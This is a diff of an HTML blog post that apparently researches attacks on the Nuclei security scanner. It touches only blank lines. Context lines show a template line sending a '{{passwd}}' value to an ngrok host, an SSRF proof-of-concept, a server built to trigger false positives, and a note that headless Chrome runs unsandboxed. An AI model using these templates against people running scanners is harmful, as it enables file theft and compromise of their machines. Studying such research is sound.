@@ -101,7 +101,6 @@
 <span class="w">      </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;https://133713371337.ngrok.io/{{passwd}}&quot;</span>
 </code></pre></div>
 
-
 <h2>SSRF</h2>
 <div class="codehilite"><pre><span></span><code><span class="n">id</span><span class="o">:</span><span class="w"> </span><span class="n">ssrf</span><span class="o">-</span><span class="n">poc</span>
 
@@ -125,7 +124,6 @@
 <span class="w">          </span><span class="o">-</span><span class="w"> </span><span class="s2">&quot;.*&quot;</span>
 </code></pre></div>
 
-
 <p>Is this a SERVER SIDE, or Client Side? Hacker Side? The question remains...</p>
 <h1>False positive server</h1>
 <p>What if you made a server that responds all the right answers and it's vulnerable to everything?</p>
@@ -140,7 +138,6 @@
 <span class="w">    </span><span class="o">...</span><span class="p">:</span><span class="w">     </span><span class="n">except</span><span class="w"> </span><span class="p">:</span>
 <span class="w">    </span><span class="o">...</span><span class="p">:</span><span class="w">         </span><span class="k">pass</span>
 </code></pre></div>
-
 
 <ol>
 <li>Put this string on your servers </li>
@@ -647,7 +644,6 @@
 
 
 </div>
-
 <p>(bit of overkill, I know)</p>
 <p>Example of a false positive server : </p>
 <div class="codehilite"><pre><span></span><code><span class="c1"># coding: utf-8</span>
@@ -663,7 +659,6 @@
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
     <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 </code></pre></div>
-
 
 <ol>
 <li>Fun</li>
@@ -733,7 +728,6 @@
 <span class="p">...</span>
 </code></pre></div>
 
-
 <p>You can also do a Reverse Nuclei Proxy that identifies the incoming Nuclei request and outputs the expected template matcher. I started coding this, but the demonic string above is cooler and easier. </p>
 <h1>Headless Chrome</h1>
 <p>As seen above, the Headless Chrome of Nuclei runs WITHOUT the Sandbox.</p>
@@ -753,7 +747,6 @@
 <span class="w">        </span><span class="nf">Delete</span><span class="p">(</span><span class="s">&quot;use-mock-keychain&quot;</span><span class="p">)</span><span class="o">.</span>
 <span class="w">        </span><span class="nf">UserDataDir</span><span class="p">(</span><span class="nv">dataStore</span><span class="p">)</span>
 </code></pre></div>
-
 
 <p><a href="https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46">https://github.com/projectdiscovery/nuclei/blob/f5fb8aa305121ceb28981436008acb180b99f0fc/v2/pkg/protocols/headless/engine/engine.go#L46</a></p>
 <p>So every 1day on chrome will become a RCE on Nuclei. Dont ever run <code>-headless</code> I guess.</p>
